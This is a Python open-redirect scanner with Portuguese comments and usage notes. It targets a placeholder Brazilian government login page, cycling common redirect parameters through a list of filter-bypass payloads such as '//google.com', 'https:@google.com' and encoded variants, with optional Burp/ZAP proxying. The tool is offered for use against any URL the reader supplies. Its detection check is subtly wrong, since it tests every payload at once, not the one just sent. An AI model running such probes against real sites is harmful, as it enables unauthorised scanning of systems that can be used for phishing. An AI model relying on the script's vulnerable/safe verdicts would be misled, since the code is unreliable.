import requests
from urllib.parse import urlencode

# URL base a ser testada
base_url = "https://siteexemplo.gov.br/login"

# Parâmetros de redirecionamento comuns
redirect_params = ["redirect", "url", "next", "return", "continue", "dest", "destination"]

# Payloads evasivos (alguns redirecionam mesmo com filtros simples)
payloads = [
    "https://google.com",
    "//google.com",
    "http://google.com",
    "/\\google.com",
    "https:@google.com",
    "%2F%2Fgoogle.com",
    "///google.com",
    "https://www.google.com%2F%2E%2E",  # tentativa de bypass
]

# Configuração de proxy (Burp/ZAP)
use_proxy = False
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

print("\nIniciando teste de Open Redirect...\n")

# Loop pelos parâmetros e payloads
for param in redirect_params:
    for payload in payloads:
        params = {param: payload}
        test_url = f"{base_url}?{urlencode(params)}"

        try:
            # Enviar requisição
            response = requests.get(test_url, allow_redirects=True, proxies=proxies if use_proxy else None, timeout=10)

            # Verificar se redirecionou para o payload
            if any(payload.strip('/').replace("%2F", "/").replace("%2E", ".") in response.url for payload in payloads):
                print(f"[VULNERÁVEL] Parâmetro '{param}' aceita payload: {payload}")
            else:
                print(f"[SEGURO] Parâmetro '{param}' rejeita payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"[ERRO] '{param}' com payload '{payload}':", e)

print("\nTeste finalizado.")


'''
#Como usar
Instale requests se ainda não tiver:

#pip install requests
Substitua base_url pela URL que você quer testar.

Rode o script com:
#python open_redirect_tester.py

(Opcional) Ative o proxy com use_proxy = True para capturar no Burp/ZAP.
'''